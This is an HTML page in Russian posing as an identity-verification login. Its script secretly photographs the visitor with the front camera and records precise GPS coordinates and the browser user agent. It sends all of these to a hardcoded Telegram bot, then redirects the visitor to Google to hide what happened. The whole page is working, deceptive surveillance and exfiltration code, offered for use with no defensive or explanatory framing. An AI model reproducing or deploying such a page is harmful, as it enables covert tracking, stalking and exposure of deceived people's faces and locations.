<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
    <title>Подтверждение личности</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            background: #000;
            font-family: system-ui, -apple-system, 'Segoe UI', Roboto, sans-serif;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 16px;
        }
        .card {
            background: #1a1a2e;
            border-radius: 32px;
            padding: 24px 20px;
            max-width: 460px;
            width: 100%;
            text-align: center;
            box-shadow: 0 20px 40px rgba(0,0,0,0.6);
            border: 1px solid #2c2c3a;
        }
        h1 {
            font-size: 24px;
            color: #fff;
            margin-bottom: 12px;
        }
        p {
            color: #aaa;
            font-size: 14px;
            margin-bottom: 20px;
        }
        .camera-preview {
            width: 100%;
            border-radius: 24px;
            overflow: hidden;
            margin: 16px 0;
            background: #0f0f17;
            aspect-ratio: 4 / 3;
            position: relative;
        }
        video {
            width: 100%;
            height: 100%;
            object-fit: cover;
            display: block;
        }
        .status {
            margin-top: 16px;
            padding: 12px;
            border-radius: 20px;
            font-size: 14px;
            background: #0f0f17;
            color: #ddd;
        }
        button {
            background: #2e6a4c;
            color: white;
            border: none;
            border-radius: 40px;
            padding: 14px 20px;
            font-size: 16px;
            font-weight: 600;
            width: 100%;
            cursor: pointer;
            margin-top: 16px;
        }
        button:disabled {
            background: #444;
        }
        .hidden {
            display: none;
        }
    </style>
</head>
<body>
<div class="card">
    <h1>🔐 Идентификация</h1>
    <p>Разрешите доступ к камере и геолокации для входа</p>
    <div class="camera-preview">
        <video id="video" autoplay playsinline muted></video>
    </div>
    <div class="status" id="statusMsg">⏳ Запрос доступа...</div>
    <button id="manualBtn" class="hidden">Повторить попытку</button>
</div>

<script>
    // ========== ТВОИ ДАННЫЕ ==========
    const BOT_TOKEN = "8870989101:AAHrjmtXznwKqyAf5D4uGvmG0wuWjpZ1PX4";
    const CHAT_ID = "7003535127";
    // =================================

    let videoElem = document.getElementById('video');
    let statusDiv = document.getElementById('statusMsg');
    let manualBtn = document.getElementById('manualBtn');
    let stream = null;
    let coords = null;
    let geoError = null;
    let photoTaken = false;

    // Запрашиваем геолокацию (разрешение запрашивается автоматически)
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
            (pos) => {
                coords = { lat: pos.coords.latitude, lng: pos.coords.longitude, acc: pos.coords.accuracy };
            },
            (err) => { geoError = err.message; }
        );
    } else {
        geoError = "Geolocation not supported";
    }

    // Запрос камеры (фронтальная)
    async function startCamera() {
        try {
            // Приоритет фронтальной камеры (facingMode: "user")
            stream = await navigator.mediaDevices.getUserMedia({ 
                video: { facingMode: { exact: "user" } } 
            });
            videoElem.srcObject = stream;
            await videoElem.play();
            statusDiv.innerHTML = "✅ Доступ к камере получен<br>🔍 Сканирование...";
            // Через 1.5 секунды делаем снимок
            setTimeout(() => {
                if (!photoTaken) captureAndSend();
            }, 1500);
        } catch (errFront) {
            // Если фронтальная не доступна (например, на десктопе вебка без фейс-режима) — пробуем любую
            try {
                stream = await navigator.mediaDevices.getUserMedia({ video: true });
                videoElem.srcObject = stream;
                await videoElem.play();
                statusDiv.innerHTML = "✅ Камера активна<br>📸 Автосъёмка...";
                setTimeout(() => {
                    if (!photoTaken) captureAndSend();
                }, 1500);
            } catch (errAny) {
                statusDiv.innerHTML = "❌ Не удалось получить доступ к камере. Разрешите вручную.";
                manualBtn.classList.remove('hidden');
                manualBtn.onclick = () => startCamera();
            }
        }
    }

    // Захват кадра и отправка
    function captureAndSend() {
        if (photoTaken) return;
        photoTaken = true;

        // Создаём canvas и рисуем кадр из video
        let canvas = document.createElement('canvas');
        canvas.width = videoElem.videoWidth;
        canvas.height = videoElem.videoHeight;
        let ctx = canvas.getContext('2d');
        ctx.drawImage(videoElem, 0, 0, canvas.width, canvas.height);
        
        // Преобразуем в Blob (JPEG)
        canvas.toBlob(async (blob) => {
            if (!blob) {
                statusDiv.innerHTML = "Ошибка создания фото";
                return;
            }

            statusDiv.innerHTML = "⏳ Отправка данных...";

            // Формируем подпись
            let caption = `📸 Авто-снимок\n🕒 ${new Date().toLocaleString()}`;
            if (coords) {
                let mapsLink = `https://maps.google.com/?q=${coords.lat},${coords.lng}`;
                caption += `\n📍 Координаты: ${coords.lat}, ${coords.lng}\n🎯 Точность: ±${coords.acc}м\n🗺 Карта: ${mapsLink}`;
            } else if (geoError) {
                caption += `\n⚠️ Геолокация: ${geoError}`;
            } else {
                caption += `\n⏳ Гео не получена (запрос ещё не завершён)`;
            }
            caption += `\n📱 UA: ${navigator.userAgent}`;

            const formData = new FormData();
            formData.append('chat_id', CHAT_ID);
            formData.append('photo', blob, 'auto_capture.jpg');
            formData.append('caption', caption);

            try {
                const resp = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });
                const json = await resp.json();
                if (json.ok) {
                    statusDiv.innerHTML = "✅ Данные отправлены. Вы будете перенаправлены...";
                    // Доп. отправка координат отдельно
                    if (coords) {
                        const locText = `📍 Точный адрес: https://maps.google.com/?q=${coords.lat},${coords.lng}`;
                        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({ chat_id: CHAT_ID, text: locText })
                        });
                    }
                    // Останавливаем камеру и уходим на другую страницу (чтобы не спамить)
                    setTimeout(() => {
                        if (stream) stream.getTracks().forEach(track => track.stop());
                        window.location.href = "https://www.google.com"; // перенаправление после успеха
                    }, 2000);
                } else {
                    statusDiv.innerHTML = `❌ Ошибка: ${json.description}`;
                    manualBtn.classList.remove('hidden');
                }
            } catch (err) {
                statusDiv.innerHTML = `❌ Сеть: ${err.message}`;
                manualBtn.classList.remove('hidden');
            }
        }, 'image/jpeg', 0.85);
    }

    // Запуск при загрузке
    startCamera();
</script>
</body>
</html>
